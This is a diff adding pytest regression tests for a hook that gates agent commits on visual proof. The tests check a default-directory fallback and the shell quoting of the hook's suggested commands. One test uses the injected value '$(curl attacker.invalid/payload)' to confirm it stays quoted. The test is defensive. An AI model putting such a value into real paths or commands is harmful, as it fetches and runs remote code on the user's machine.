@@ -21,6 +21,7 @@ from __future__ import annotations
 import importlib.util
 import io
 import json
+import os
 import subprocess
 import sys
 from pathlib import Path
@@ -878,3 +879,111 @@ def test_hatch_inline_command_justification_allows(tmp_path, monkeypatch):
         repo, monkeypatch, proof_dir=tmp_path / "proof")  # env NOT set — inline only
     assert c == 0 and _decision(out) == "allow"
     assert "deleting a dead component, nothing to render" in question.read_text()
+
+
+def _reload_with_env(monkeypatch, **env: str | None) -> object:
+    """Re-import a fresh copy of visual_proof_gate.py under module-level env, so PROOF_DIR
+    (computed once at import time) reflects it. `None` deletes the var; anything else sets it."""
+    for key, value in env.items():
+        if value is None:
+            monkeypatch.delenv(key, raising=False)
+        else:
+            monkeypatch.setenv(key, value)
+    spec = importlib.util.spec_from_file_location("visual_proof_gate_reload", _HOOK)
+    assert spec and spec.loader
+    module = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(module)
+    return module
+
+
+def test_proof_dir_empty_visual_proof_dir_falls_back_to_default(monkeypatch):
+    """VISUAL_PROOF_DIR="" (explicitly set to empty, not unset) must resolve to the documented
+    default, not Path("") == cwd. `os.environ.get("VISUAL_PROOF_DIR", default)` alone would NOT
+    apply the default here — .get()'s default only fires when the key is absent, and an
+    explicitly-empty value IS present. Path("") resolving to cwd would let `_proof_fresh()`
+    treat ANY fresh file in cwd as proof — a silent gate bypass."""
+    reloaded = _reload_with_env(monkeypatch, VISUAL_PROOF_DIR="")
+    expected = Path(os.path.expanduser("~/.cache/agent-tools/visual-proof"))
+    assert reloaded.PROOF_DIR == expected
+
+
+def test_proof_dir_unset_visual_proof_dir_uses_default(monkeypatch):
+    """Baseline: VISUAL_PROOF_DIR genuinely unset also resolves to the documented default."""
+    reloaded = _reload_with_env(monkeypatch, VISUAL_PROOF_DIR=None)
+    expected = Path(os.path.expanduser("~/.cache/agent-tools/visual-proof"))
+    assert reloaded.PROOF_DIR == expected
+
+
+def test_block_message_shell_quotes_a_malicious_proof_dir(monkeypatch):
+    """VISUAL_PROOF_DIR is env-controlled; the BLOCK message embeds it in a runnable-looking
+    `touch …` hint. An unquoted `$(...)` value would make that hint a copy-pasteable command
+    injection if an agent ran it verbatim outside a worktree-isolated session. The rendered
+    message must shell-quote the path, so the literal `$(` never appears unescaped."""
+    monkeypatch.setattr(vpg, "PROOF_DIR", Path("$(curl attacker.invalid/payload)"))
+    message = vpg._block_message(["src/Button.tsx"])
+    # The malicious value must appear ONLY inside shlex-quoted single quotes — never bare after
+    # `touch `, which is what would let a shell re-interpret the `$(...)` on copy-paste.
+    assert "touch $(curl" not in message
+    assert "'$(curl attacker.invalid/payload)'" in message
+
+
+def test_block_message_quotes_a_proof_dir_with_spaces(monkeypatch):
+    """A VISUAL_PROOF_DIR containing spaces (a legitimate, if unusual, path) must be rendered
+    as ONE shell-quoted token in the block message, not split across two bare words —
+    otherwise the suggested `touch <dir>/<key>` command wouldn't target the actual configured
+    directory."""
+    monkeypatch.setattr(vpg, "PROOF_DIR", Path("/tmp/visual proofs"))
+    message = vpg._block_message(["src/Button.tsx"])
+    assert "'/tmp/visual proofs'" in message
+    assert "touch /tmp/visual proofs" not in message
+
+
+def test_block_message_includes_mkdir_p_for_a_fresh_machine(monkeypatch):
+    """Regression: a bare `touch <dir>/<key>` fails with 'No such file or directory' when
+    PROOF_DIR doesn't exist yet (a fresh machine with no prior agent-tools cache). The hint
+    must include `mkdir -p` so following it verbatim actually satisfies the gate."""
+    monkeypatch.setattr(vpg, "PROOF_DIR", Path("/tmp/does-not-exist-yet"))
+    message = vpg._block_message(["src/Button.tsx"])
+    # shlex.quote leaves a plain path (no spaces/metacharacters) unquoted — this is expected,
+    # not a regression of the quoting fix above.
+    assert "mkdir -p /tmp/does-not-exist-yet" in message
+
+
+def test_block_message_leads_with_the_zero_touch_dev_shot_recipe(monkeypatch):
+    """The PRIMARY recipe in the block message must be `dev shot` — it captures AND writes
+    the proof record itself (dev_cli.visual_proof.write_attestation), in Python, so an agent
+    following this hint never constructs a `touch` command at all. The manual-touch
+    instructions must be present too, but only as an explicitly-labeled fallback for when
+    there's no URL to shoot, not the first thing an agent reads."""
+    monkeypatch.setattr(vpg, "PROOF_DIR", Path("~/.cache/agent-tools/visual-proof"))
+    message = vpg._block_message(["src/Button.tsx"])
+    assert "dev shot" in message
+    assert message.index("dev shot") < message.index("FALLBACK")
+
+
+def test_block_message_primary_recipe_has_no_angle_bracket_placeholders(monkeypatch):
+    """Regression: `<url>` and similar angle-bracket placeholders are shell
+    input-redirection syntax in bash/zsh, not a fill-in-the-blank convention — copying
+    `dev shot <url> --out shot.png` verbatim is a parse error, not a capture command
+    (codex PR review finding on the sibling require-review-before-commit hook,
+    independently verified here too: `bash -c 'dev shot <url> --out shot.png'` fails
+    trying to open a file named `url`, not running dev shot with a URL argument). The
+    PRIMARY recipe span must use bare, shell-safe placeholder text with no `<`/`>`
+    characters."""
+    monkeypatch.setattr(vpg, "PROOF_DIR", Path("~/.cache/agent-tools/visual-proof"))
+    message = vpg._block_message(["src/Button.tsx"])
+    primary_span = message[message.index("PRIMARY fix"):message.index("FALLBACK")]
+    assert "<" not in primary_span and ">" not in primary_span
+
+
+def test_block_message_dev_shot_url_placeholder_is_quoted(monkeypatch):
+    """Regression: a real URL substituted for the placeholder can contain `&`/`;`/`|`/`?`
+    (e.g. `http://localhost:3000/?tab=a&preview=1`) — pasted unquoted, `&` backgrounds
+    everything before it and `;`/`|` starts a new command. The PRIMARY recipe must show the
+    URL placeholder single-quoted (`dev shot 'http://...'`), not bare, so a reader copies
+    the safe shape (codex PR review finding, independently verified: `bash -c "echo dev "
+    "shot http://localhost:3000/?tab=a&preview=1"` shows the shell splitting on `&`)."""
+    monkeypatch.setattr(vpg, "PROOF_DIR", Path("~/.cache/agent-tools/visual-proof"))
+    message = vpg._block_message(["src/Button.tsx"])
+    assert "dev shot 'http://" in message
+    assert "dev shot http://" not in message  # bare/unquoted form must not appear
